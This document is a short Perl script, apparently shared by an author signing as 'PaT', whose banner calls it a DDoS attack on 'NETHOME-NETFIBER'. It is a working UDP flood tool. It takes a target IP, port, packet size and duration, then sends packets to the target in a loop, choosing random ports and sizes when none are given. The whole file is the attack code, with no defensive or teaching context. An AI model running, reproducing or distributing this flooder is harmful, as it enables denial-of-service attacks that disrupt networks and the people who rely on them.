#!/usr/bin/perl

##############
# udp fiber.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  system("clear || cls");
#Script Banner================================================================
print q{
  ===============================================================================
                                 ATTACK DOOS NETHOME-NETFIBER BY:PaT                                
  ===============================================================================
             > BY:Edit Script By PaT <
 };
# INPUT TARGET INFO ==============================================
 print " \n";
 print " DDOS NET FIBER:) // \n\n";
 print "Commande: perl Fiber.pl <IP> <PORT> <size> <TIME>\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Impossible de se connecter ร  $ip\n";
$endtime = time() + ($time ? $time : 50);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print  "START ATTACK IP $ip
START ATTACK port " . ($port ? $port : "443"). " \n";

print " \n";
print  "ATTACK DONE BY:PaT...\n";
print "Attaque avec Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}